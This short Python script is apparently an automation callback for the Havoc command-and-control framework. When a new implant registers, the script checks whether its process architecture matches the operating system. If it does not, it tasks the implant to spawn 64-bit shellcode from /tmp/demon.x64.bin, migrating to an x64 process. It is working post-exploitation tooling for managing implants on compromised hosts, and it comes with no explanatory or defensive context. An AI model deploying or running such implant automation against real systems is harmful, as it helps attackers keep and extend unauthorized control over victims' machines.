from havoc import Demon, RegisterCallback

def new_demon( demonID ):
    demon  : Demon  = None
    demon  = Demon( demonID )

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"migrating to x64" )
        demon.Command(TaskID, 'shellcode spawn x64 /tmp/demon.x64.bin')

RegisterCallback(new_demon)
